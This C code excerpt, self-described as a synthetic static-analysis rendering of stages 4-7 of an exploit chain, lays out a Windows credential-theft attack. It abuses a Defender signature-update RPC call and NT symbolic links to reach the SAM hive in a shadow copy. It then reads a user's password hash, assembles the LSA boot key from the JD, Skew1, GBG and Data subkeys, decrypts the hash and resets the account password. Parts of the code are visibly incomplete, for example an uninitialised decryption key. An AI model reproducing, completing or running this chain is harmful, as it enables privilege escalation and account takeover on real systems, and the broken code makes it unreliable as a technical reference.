/* Synthetic static-analysis excerpt of Qualys BlueHammer stages 4-7.
 * Harness supplies NT object attributes, handles, SAMR buffers and RPC stubs.
 * Not an original binary or a runnable exploit. */
void exchange_objects(HANDLE staged, HANDLE old_alias, HANDLE root,
                 OBJECT_ATTRIBUTES *alias, OBJECT_ATTRIBUTES *definition,
                 UNICODE_STRING *redirect, HANDLE transaction,
                 void *old_hash, void *new_hash, void *account) {
    const wchar_t *sam = L"\\??\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy19\\Windows\\System32\\Config\\SAM";
    const wchar_t *update_alias = L"ChangedAlias";
    const wchar_t *definition_name = L"other.vdm";
    RPC_BINDING_HANDLE binding;
    RpcBindingFromStringBindingW(L"ncalrpc:[IMpService77BDAF73-B396-481F-9042-AD358843EC24]", &binding);
    RpcStringBindingComposeW(L"c503f532-443a-4c69-8300-ccd1fbdb3839", L"ncalrpc", 0, 0, 0, 0);
    ServerMpUpdateEngineSignature(binding, L"\\\\?\\GLOBALROOT\\Sessions\\2\\BaseNamedObjects\\{GUID}\\ChangedAlias");
    OVERLAPPED ov = {0}; DWORD returned;
    DeviceIoControl(staged, 589832, 0, 0, 0, 0, &returned, &ov);
    GetOverlappedResult(staged, &ov, &returned, TRUE);
    CloseHandle(old_alias);
    NtCreateSymbolicLinkObject(&old_alias, SYMBOLIC_LINK_ALL_ACCESS, alias, redirect);
    RtlInitUnicodeString(redirect, sam);
    NtCreateSymbolicLinkObject(&root, SYMBOLIC_LINK_ALL_ACCESS, definition, redirect);
    CloseHandle(staged);
    HANDLE leaked = CreateFileTransactedW(definition_name, GENERIC_READ, FILE_SHARE_READ, 0,
        OPEN_EXISTING, 0, 0, transaction, 0, 0);
    ORHKEY hive, users; BYTE value[4096]; DWORD length = sizeof(value);
    OROpenHiveByHandle(leaked, &hive);
    OROpenKey(hive, L"SAM\\Domains\\Account", &users);
    ORGetValue(users, L"Users\\000003E9", L"V", 0, value, &length);
    HKEY lsa, part; char classes[1024]; DWORD class_length;
    const wchar_t *parts[] = {L"JD", L"Skew1", L"GBG", L"Data"};
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &lsa);
    for (int i = 0; i < 4; ++i) {
        RegOpenKeyExW(lsa, parts[i], 0, KEY_READ, &part);
        class_length = sizeof(classes);
        RegQueryInfoKeyA(part, classes, &class_length, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        RegCloseKey(part);
    }
    HCRYPTKEY key;
    CryptDecrypt(key, 0, TRUE, 0, value, &length);
    SamiChangePasswordUser(account, old_hash, new_hash);
}
